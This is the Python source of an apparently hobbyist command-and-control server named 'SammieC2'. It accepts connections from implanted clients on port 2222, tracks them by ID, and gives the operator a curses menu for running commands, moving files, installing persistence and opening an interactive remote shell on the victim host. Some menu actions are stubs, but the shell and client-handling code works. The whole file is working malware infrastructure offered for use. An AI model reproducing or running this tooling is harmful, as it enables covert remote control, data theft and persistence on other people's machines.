#!/usr/bin/python3

import socket, threading, os, time, base64, uuid, curses, curses.ascii

connected_clients = []
clients_lock = threading.Lock()

os.system("export TERM='xterm-256color'")

def recv_until_newline(socket):
  data = socket.recv(1)
  while data[-1] != 10:
    data += socket.recv(1)

  return data[:-1]

def recv_base64(socket):
  b64_data = recv_until_newline(socket)

  data = base64.b64decode(b64_data).decode()

  return data.strip()

def send_as_base64(data, socket):
  b64_data = base64.b64encode(data.encode()) + b"\n"
  socket.send(b64_data)
  return len(b64_data)

class Client:
  def __init__(self, socket):
    self.socket = socket
    self.ftp = None
    self.shell = None
  
  def send(self, data):
    return send_as_base64(data, self.socket)
  
  def recv(self):
    return recv_base64(self.socket)

  def register(self):
    self.sysinfo = self.recv()
    self.id = str(uuid.uuid4())
    self.send("id " + self.id)

  def close(self):
    self.send("gtfo")
    self.socket.close()
    self.socket = None

  def execute_command(self, command):
    self.send("x " + command)
    return self.recv()

  def send_file(self, local_file_path, client_file_path):
    self.send("d " + client_file_path)
    with open(local_file_path, 'rb') as f:
      data = f.read()
    b64_data = base64.b64encode(data) + b"\n"
    wait_count = 0
    while self.ftp == None and wait_count < 600:
      time.sleep(0.1)
      wait_count += 1
    
    if self.ftp == None:
      return False
    
    self.ftp.send(b64_data)
    self.ftp.close()
    self.ftp = None
    return True
  
  def recieve_file(self, local_file_path, client_file_path):
    self.send("u " + client_file_path)

    wait_count = 0
    while self.ftp == None and wait_count < 600:
      time.sleep(0.1)
      wait_count += 1

    if self.ftp == None:
      return False

    b64_data = recv_until_newline(self.socket)
    
    data = base64.b64decode(b64_data)

    with open(local_file_path, 'wb') as f:
      f.write(data)

    return True

  def create_persistence(self, local_file_path, client_file_path):
    self.send("p " + client_file_path)
    with open(local_file_path, 'rb') as f:
      data = f.read()
    b64_data = base64.b64encode(data) + b"\n"
    wait_count = 0
    while self.ftp == None and wait_count < 600:
      time.sleep(0.1)
      wait_count += 1
    
    if self.ftp == None:
      return False
    
    self.ftp.send(b64_data)
    self.ftp.close()
    self.ftp = None
    return True
    

  def spawn_shell(self):
    self.send("shell")

    wait_count = 0
    while self.shell == None and wait_count < 600:
      time.sleep(0.1)
      wait_count += 1

    if self.shell == None:
      return False

    self.shell_thread = threading.Thread(target=self.shell_recv)
    self.shell_thread.start()
    self.shell_lock = threading.Lock()
    self.shell_data = ""
    
    return True

  def shell_send(self, data):
    return self.shell.send(data.encode())

  def shell_recv(self):
    t = threading.currentThread()

    while getattr(t, "running", True):
      data = self.shell.recv(1024).decode()

      with self.shell_lock:
        self.shell_data += data

      time.sleep(0.1)

    self.shell.close()

  def shell_read(self):
    with self.shell_lock:
      data = self.shell_data
      self.shell_data = ""
    
    return data


class Server:
  def __init__(self):
    self.socket = socket.socket(socket.SO_REUSEADDR)
  
  def serve(self, port, handle_client):
    t = threading.currentThread()

    self.socket.bind(("0.0.0.0", port))
    self.socket.listen(5)

    while getattr(t, "running", True):
      c, a = self.socket.accept()
      handle_client(c)

  def close(self):
    self.socket.close()

def handle_client(c):
  global connected_clients
  client = Client(c)
  client_type = client.recv()

  if client_type.startswith("new"):
    client.register()

    with clients_lock:
      connected_clients.append(client)

    return

  key = client_type[:2]

  if key in ["ul", "dl", "sh", "re"]:
    cid = client_type.split(" ")[-1].strip()
    with clients_lock:
      possible = list(filter(lambda cl: cl.id == cid, connected_clients))
      if len(possible) == 0:
        client.close()
        return

      if key in ["ul", "dl"]:
        possible[0].ftp = c
        return
      elif key == "re":
        possible[0].socket.close()
        possible[0].socket = c
        return
      else:
        possible[0].shell = c
        return
    return
  
  client.close()
  return

def fake_connect():
  s = socket.socket()

  s.connect(("localhost", 2222))
  s.send("REVBREJFRUY=\n".encode())
  s.close()

def curses_logo(stdscr):
  LOGO = """
   _____                           _       _________ 
  / ___/____ _____ ___  ____ ___  (_)__   / ____/__ \\
  \__ \/ __ `/ __ `__ \/ __ `__ \/ / _ \ / /    __/ /
 ___/ / /_/ / / / / / / / / / / / /  __// /___ / __/ 
/____/\__,_/_/ /_/ /_/_/ /_/ /_/_/\___/ \____//____/ 
Made with love and shoddy code""".split("\n")[1:]

  y,x = stdscr.getmaxyx()

  w = len(LOGO[0])
  h = len(LOGO)

  wp = (x-w)//2-1
  hp = (y-h)//2-1

  stdscr.clear()

  for i,line in enumerate(LOGO):
    if i == h-1:
      stdscr.addstr(i+hp, wp, line, curses.color_pair(227))
    else:
      stdscr.addstr(i+hp, wp, line)

  stdscr.refresh()

  time.sleep(2)

def curses_main(stdscr):
  curses.curs_set(0)
  stdscr.nodelay(True)

  curses.start_color()
  curses.use_default_colors()
  for i in range(0, curses.COLORS):
    curses.init_pair(i + 1, i, -1)

  curses_logo(stdscr)

  k = 0

  menu_selected = 0
  menu_offset = 0

  while k != 113:
    with clients_lock:
      menu = [(client.id, client) for client in connected_clients]

    stdscr.clear()
    curses.doupdate()
    k = stdscr.getch()
    curses.flushinp()
    h,w = stdscr.getmaxyx()

    if menu_selected > h:
      menu_offset = menu_selected - (h-1)
    
    if len(menu):
      for i,client in enumerate(menu[menu_offset:menu_offset+h-1]):
        if i == menu_selected-menu_offset:
          stdscr.addstr(i, 0, str(i+1+menu_offset) + ") " + client[0], curses.A_REVERSE)
        else:
          stdscr.addstr(i, 0, str(i+1+menu_offset) + ") " + client[0])
    else:
      stdscr.addstr(0,0,"No Clients Connected")

    stdscr.addstr(h-1,0,"Press 'q' to quit")

    stdscr.refresh()

    if len(menu):
      if k == curses.KEY_UP:
        menu_selected = (menu_selected-1)%len(menu)
      elif k == curses.KEY_DOWN:
        menu_selected = (menu_selected+1)%len(menu)
      elif k == curses.KEY_ENTER or k == 10:
        curses_client_menu(stdscr, menu[menu_selected][1])

    time.sleep(.1)

def remove_client(client):
  global connected_clients

  with clients_lock:
    connected_clients.remove(client)

def curses_shell(stdscr, client):
  input_value = ""
  shell_output = []

  while True:
    stdscr.clear()
    curses.doupdate()
    h,w = stdscr.getmaxyx()
    k = stdscr.getch()
    curses.flushinp()

    if curses.ascii.isascii(k):
      input_value += chr(k)
    if k in [curses.KEY_BACKSPACE, ord('\b')]:
      input_value = input_value[:-1]
    if k == curses.KEY_ENTER or k == 10 or "\n" in input_value:
      client.shell_send(input_value.split("\n")[0] + "\n")
      input_value = ""

    new_output = client.shell_read()

    if new_output:
      shell_output += new_output.split("\n")
      new = []

      for line in shell_output:
        if line:
          new.append(line)

      shell_output = new

    if len(shell_output) > h-1:
      shell_output = shell_output[-h+2:]

    for i,line in enumerate(shell_output):
      stdscr.addstr(i,0,line[:w])

    stdscr.addstr(h-1,0, "$ " + input_value[-w+2:])
    stdscr.refresh()
    time.sleep(.1)
    




def curses_client_menu(stdscr, client):
  menu_selected = 0

  menu_options = ["Back", "Execute Command", "Download File", "Upload File", "Upload Persistence", "Spawn Shell", "Disconnect"]

  while True:
    stdscr.clear()
    curses.doupdate()
    k = stdscr.getch()
    curses.flushinp()
    h,w = stdscr.getmaxyx()

    if k == curses.KEY_UP:
      menu_selected = (menu_selected-1)%len(menu_options)
    elif k == curses.KEY_DOWN:
      menu_selected = (menu_selected+1)%len(menu_options)
    elif k == curses.KEY_ENTER or k == 10:
      if menu_selected == 0:
        return
      elif menu_selected == 1:
        pass
      elif menu_selected == 2:
        pass
      elif menu_selected == 3:
        pass
      elif menu_selected == 4:
        pass
      elif menu_selected == 5:
        if client.spawn_shell():
          curses_shell(stdscr, client)
        else:
          client.close()
          remove_client(client)
          return
      elif menu_selected == 6:
        client.close()
        remove_client(client)
        return
      
    for i,option in enumerate(menu_options):
      if i == menu_selected:
        stdscr.addstr(i,0,option, curses.A_REVERSE)
      else:
        stdscr.addstr(i,0,option)

    stdscr.refresh()
    time.sleep(.1)



def main():
  s = Server()

  server_thread = threading.Thread(target=s.serve, args=(2222, handle_client))
  server_thread.start()

  try:
    curses.wrapper(curses_main)
  except KeyboardInterrupt:
    pass
  
  server_thread.running = False
  fake_connect()

  for client in connected_clients:
    client.close()

  server_thread.join()

if __name__ == "__main__":
  main()
